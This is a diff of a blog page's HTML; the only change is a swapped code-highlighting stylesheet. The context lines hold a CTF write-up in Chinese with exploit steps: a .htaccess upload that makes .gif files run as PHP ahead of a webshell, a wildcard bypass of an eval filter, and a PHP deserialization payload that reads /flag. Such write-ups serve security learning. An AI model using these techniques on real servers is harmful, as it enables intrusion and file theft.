@@ -29,7 +29,15 @@
     
     
       
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css" />
+      
+        
+          
+          
+          
+        
+        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
+      
+      
     
   
 
@@ -252,17 +260,17 @@
 <p><img src="https://ftp.bmp.ovh/imgs/2021/05/ba7dc9869ba2aa96.png" srcset="/img/loading.gif">      </p>
 <p>这个设为了<code>off</code>会限制目录下的PHP文件没有执行权限<br><img src="https://ftp.bmp.ovh/imgs/2021/05/248d2e75b77fddd4.png" srcset="/img/loading.gif">        </p>
 <p>通过传入<code>.htaccess</code>文件来覆盖配置文件中的设置（<code>.htaccess</code>文件作用所在的目录和所有子目录，指令按查找顺序依次生效，所以子目录下的<code>.htaccess</code>可能会覆盖父目录下或者配置文件中的指令）      </p>
-<div class="hljs"><pre><code>&lt;Files &quot;*.gif&quot;&gt;
+<pre><code>&lt;Files &quot;*.gif&quot;&gt;
 ForceType application/x-httpd-php
 SetHandler application/x-httpd-php
 php_flag engine on
-&lt;/Files&gt;</code></pre></div>
+&lt;/Files&gt;</code></pre>
 <p><code>&lt;file&gt;</code>标签比<code>&lt;directory&gt;</code>优先级高     </p>
 <p>然后上传一句话木马，文件后缀名改为<code>.gif</code>      </p>
 <p>蚁剑连上也没用，有<code>disable_function</code>,访问一句话文件<code>var_dump(file_get_contents(&#39;/flag&#39;));</code>可以<img src="https://ftp.bmp.ovh/imgs/2021/05/4364ac2b513673d6.png" srcset="/img/loading.gif">        </p>
 <p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8267">Apache的.htaccess利用技巧</a>    </p>
 <h2 id="hate-php"><a href="#hate-php" class="headerlink" title="hate_php"></a>hate_php</h2><p>php代码审计   </p>
-<div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 error_reporting(<span class="hljs-number">0</span>);
 <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;
     highlight_file(<span class="hljs-keyword">__FILE__</span>);
@@ -272,7 +280,7 @@ error_reporting(<span class="hljs-number">0</span>);
         <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;fighting!&#x27;</span>); 
     &#125;
     <span class="hljs-keyword">eval</span>($code);
-&#125;</code></pre></div></code></pre>
+&#125;</code></pre></code></pre>
 <p>过滤了字母数字还有<code>_@$</code>    </p>
 <p>试了下异或，不行；url取反也不行，就没招了…….      </p>
 <p><code>通配符</code><br><code>/bin/cat /flag</code>——-&gt;<code>/???/??? /????</code>    </p>
@@ -284,7 +292,7 @@ error_reporting(<span class="hljs-number">0</span>);
 <p>未完成的文件，提示<code>swp</code>泄露，当时看到这句话没啥感觉，找了找其他也没啥，就去扫目录了      </p>
 <p>扫到<code>.index.php.swp</code>       </p>
 <p>swp文件拖到Linux回复一下<code>vi -r .index.php.swp</code>      </p>
-<div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">logger</span></span>&#123;
     <span class="hljs-keyword">public</span> $logFile;
     <span class="hljs-keyword">public</span> $initMsg;
@@ -346,11 +354,11 @@ $log_unser = unserialize($log);
 &lt;body&gt;
 &lt;p&gt;&lt;br/&gt;昨天晚上因为<span class="hljs-number">14</span>级大风停电了.&lt;/p&gt;
 &lt;/body&gt;
-&lt;/html&gt;</code></pre></div></code></pre>
+&lt;/html&gt;</code></pre></code></pre>
 <p><code>readfile</code>  、 flag在<code>/flag</code>      </p>
 <p>链<code>new weblog--&gt;wakeup--&gt;logger--&gt;__construct</code>只要将<code>$weblogfile=&#39;/flag&#39;</code>即可       </p>
 <p>flag过滤了，双写即可绕过    </p>
-<div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">logger</span></span>
 <span class="hljs-class"></span>&#123;
     <span class="hljs-keyword">public</span> $logFile;
@@ -363,10 +371,10 @@ $log_unser = unserialize($log);
     <span class="hljs-keyword">public</span> $weblogfile=<span class="hljs-string">&#x27;/flag&#x27;</span>;
 &#125;
 $a=<span class="hljs-keyword">new</span> weblog();
-<span class="hljs-keyword">echo</span> serialize($a);</code></pre></div></code></pre>
+<span class="hljs-keyword">echo</span> serialize($a);</code></pre></code></pre>
 <p>payload：<code>?log=O:6:&quot;weblog&quot;:1:&#123;s:10:&quot;weblogfile&quot;;s:5:&quot;/flflagag&quot;;&#125;</code></p>
 <p><img src="https://ftp.bmp.ovh/imgs/2021/05/c6d9e931038e0740.png" srcset="/img/loading.gif">      </p>
-<h2 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h2><div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<h2 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h2><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 highlight_file(<span class="hljs-keyword">__FILE__</span>);
     session_start();
     $url = $_GET[<span class="hljs-string">&#x27;url&#x27;</span>] ?? <span class="hljs-literal">false</span>;
@@ -385,7 +393,7 @@ highlight_file(<span class="hljs-keyword">__FILE__</span>);
             curl_close($ch);
     &#125;
 
-<span class="hljs-meta">?&gt;</span></code></pre></div></code></pre>
+<span class="hljs-meta">?&gt;</span></code></pre></code></pre>
 <p>SSRF    </p>
 <p><code>利用gopher协议攻击已知用户名无密码的Mysql</code>  </p>
 <p>算了，环境也关了，附上<br><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/j-M7gfVXdnxovWDiZGTihQ">宸极实验室的WP</a>    </p>
@@ -547,6 +555,8 @@ highlight_file(<span class="hljs-keyword">__FILE__</span>);
 
 
 
+  
+    
   
 
 
